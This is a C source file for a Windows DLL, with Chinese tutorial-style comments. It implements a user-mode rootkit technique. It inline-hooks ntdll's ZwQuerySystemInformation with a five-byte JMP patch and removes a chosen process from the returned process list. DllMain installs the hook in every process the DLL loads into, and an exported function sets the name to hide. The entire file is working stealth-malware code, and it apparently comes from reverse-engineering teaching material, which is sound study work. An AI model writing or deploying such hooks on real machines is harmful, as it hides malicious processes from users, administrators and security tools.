#include "windows.h"
#include "tchar.h"

#define STATUS_SUCCESS						(0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    PVOID Reserved2[3];
    HANDLE UniqueProcessId;
    PVOID Reserved3;
    ULONG HandleCount;
    BYTE Reserved4[4];
    PVOID Reserved5[11];
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")


// global variable (in sharing memory)
// 共享全局变量
#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()

// global variable
BYTE g_pOrgBytes[5] = { 0, };

// hook的过程就是把原函数的地址，替换为stealth中函数的过程
BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
    FARPROC pfnOrg;
    DWORD dwOldProtect, dwAddress;
    BYTE pBuf[5] = { 0xE9, 0, };
    PBYTE pByte;

    // 1、获取要hook的函数在dll中的地址
    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pfnOrg;

    // 2、判断起始地址是否为JMP指令，如果为JMP则已经被HOOK了
    if (pByte[0] == 0xE9)
        return FALSE;
    // 3、修改内存保护属性
    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // 4、备份原来的起始代码，复制到上面创建的共享节区
    memcpy(pOrgBytes, pfnOrg, 5);

    // 5、这里的dwAddress指向的是伪造的函数的地址，相对距离计算公式
    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;

    // 6、修改JMP之后的地址，组合成JMP dwAddress
    memcpy(&pBuf[1], &dwAddress, 4);

    // 7、将老函数的前5个字节修改为JMP dwAddress
    memcpy(pfnOrg, pBuf, 5);

    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}

// 脱钩就是把起始指令修改为原来的
BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;

    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pFunc;

    if (pByte[0] != 0xE9)
        return FALSE;

    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    memcpy(pFunc, pOrgBytes, 5);

    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status;
    FARPROC pFunc;
    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
    char szProcName[MAX_PATH] = { 0, };

    // 停止HOOK
    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);

    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),
        DEF_ZWQUERYSYSTEMINFORMATION);
    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
        (SystemInformationClass, SystemInformation,
            SystemInformationLength, ReturnLength);

    if (status != STATUS_SUCCESS)
        goto __NTQUERYSYSTEMINFORMATION_END;

    if (SystemInformationClass == SystemProcessInformation)
    {
        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

        while (TRUE)
        {
            if (pCur->Reserved2[1] != NULL)
            {
                if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
                {

                    if (pCur->NextEntryOffset == 0)
                        pPrev->NextEntryOffset = 0;
                    else
                        pPrev->NextEntryOffset += pCur->NextEntryOffset;
                }
                else
                    pPrev = pCur;
            }

            if (pCur->NextEntryOffset == 0)
                break;

            pCur = (PSYSTEM_PROCESS_INFORMATION)
                ((ULONG)pCur + pCur->NextEntryOffset);
        }
    }

__NTQUERYSYSTEMINFORMATION_END:

    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
        (PROC)NewZwQuerySystemInformation, g_pOrgBytes);

    return status;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    char            szCurProc[MAX_PATH] = { 0, };
    char* p = NULL;
    // 1、判断当前是否为hideProc.exe，如果是则终止，不进行hook
    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
    p = strrchr(szCurProc, '\\');
    if ((p != NULL) && !_stricmp(p + 1, "HideProc.exe"))
        return TRUE;

    switch (fdwReason)
    {
        // #2. API Hooking
    case DLL_PROCESS_ATTACH:
        hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
            (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
        break;

        // #3. API Unhooking 
    case DLL_PROCESS_DETACH:
        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
            g_pOrgBytes);
        break;
    }

    return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif
    __declspec(dllexport) void SetProcName(LPCTSTR szProcName)
    {
        _tcscpy_s(g_szProcName, szProcName);
    }
#ifdef __cplusplus
}
#endif